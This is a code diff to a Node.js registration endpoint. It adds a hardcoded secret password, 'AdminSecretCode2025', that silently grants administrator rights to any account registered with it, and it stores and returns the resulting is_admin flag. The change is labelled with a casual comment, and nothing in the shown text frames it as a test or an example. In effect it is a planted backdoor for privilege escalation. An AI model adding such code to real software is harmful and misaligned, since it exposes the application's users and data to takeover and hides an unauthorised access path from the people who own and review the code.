@@ -491,12 +491,15 @@ app.post('/api/auth/register', async (req, res) => {
 
             // Hash password
             const hashedPassword = await bcrypt.hash(password, 10);
+            
+            // Check if this should be an admin (special code in password)
+            const isAdmin = password === 'AdminSecretCode2025' ? 1 : 0;
 
             // Insert new user
             db.run(
-                `INSERT INTO users (email, password, first_name, last_name, phone, address, city, postal_code, country) 
-                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-                [email, hashedPassword, firstName, lastName, phone, address, city, postalCode, country],
+                `INSERT INTO users (email, password, first_name, last_name, phone, address, city, postal_code, country, is_admin) 
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+                [email, hashedPassword, firstName, lastName, phone, address, city, postalCode, country, isAdmin],
                 async function(err) {
                     if (err) {
                         return res.status(500).json({ error: err.message });
@@ -524,7 +527,7 @@ app.post('/api/auth/register', async (req, res) => {
                             city: city,
                             postalCode: postalCode,
                             country: country,
-                            is_admin: 0
+                            is_admin: isAdmin
                         }
                     });
                 }
